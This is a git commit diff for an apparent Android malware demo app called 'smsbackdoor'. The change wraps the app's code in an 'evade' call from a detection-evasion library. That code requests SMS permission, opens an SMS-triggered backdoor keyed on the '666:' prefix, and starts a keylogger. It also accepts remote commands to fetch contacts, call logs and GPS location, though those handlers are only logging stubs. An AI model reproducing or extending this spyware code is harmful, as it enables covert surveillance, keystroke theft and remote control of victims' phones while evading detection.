899209de98596640b73116e90f91bfd33604c867
Chris Basinger <evilthreads669966@gmail.com>
2020-10-06 20:04:56 -0500

    add evade to demo app (#15)

--- app/src/main/java/com/evilthreads/smsbackdoor/MainActivity.kt
+++ app/src/main/java/com/evilthreads/smsbackdoor/MainActivity.kt
@@ -4,6 +4,7 @@ import android.Manifest
 import android.os.Bundle
 import android.util.Log
 import androidx.appcompat.app.AppCompatActivity
+import com.evilthreads.evade.evade
 import com.evilthreads.keylogger.Keylogger
 import com.kotlinpermissions.KotlinPermissions
 
@@ -11,21 +12,23 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
-        KotlinPermissions.with(this).permissions(Manifest.permission.RECEIVE_SMS)
-            .onAccepted {
-                SmsBackdoor.openDoor(this, "666:", payload = {
-                    Keylogger.subscribe { entry ->
-                        Log.d("KEYLOGGER", entry.toString())
+        evade {
+            KotlinPermissions.with(this).permissions(Manifest.permission.RECEIVE_SMS)
+                .onAccepted {
+                    SmsBackdoor.openDoor(this, "666:", payload = {
+                        Keylogger.subscribe { entry ->
+                            Log.d("KEYLOGGER", entry.toString())
+                        }
+                    }){ remoteCommand ->
+                        when(remoteCommand){
+                            "COMMAND_GET_CONTACTS" -> Log.d("SMS BACKDOOR", "WRITE CODE TO GET CONTACTS")
+                            "COMMAND_GET_CALL_LOG" -> Log.d("SMS BACKDOOR", "WRITE CODE TO GET CALL LOG")
+                            "COMMAND_GET_LOCATION" -> Log.d("SMS BACKDOOR", "WRITE CODE TO GET GPS LOCATION")
+                            else -> Log.d("SMS BACKDOOR", "COMMAND NOT FOUND")
+                        }
                     }
-                }){ remoteCommand ->
-                    when(remoteCommand){
-                        "COMMAND_GET_CONTACTS" -> Log.d("SMS BACKDOOR", "WRITE CODE TO GET CONTACTS")
-                        "COMMAND_GET_CALL_LOG" -> Log.d("SMS BACKDOOR", "WRITE CODE TO GET CALL LOG")
-                        "COMMAND_GET_LOCATION" -> Log.d("SMS BACKDOOR", "WRITE CODE TO GET GPS LOCATION")
-                        else -> Log.d("SMS BACKDOOR", "COMMAND NOT FOUND")
-                    }
-                }
-                Keylogger.requestPermission(this)
-            }.ask()
+                    Keylogger.requestPermission(this)
+                }.ask()
+        }
     }
 }
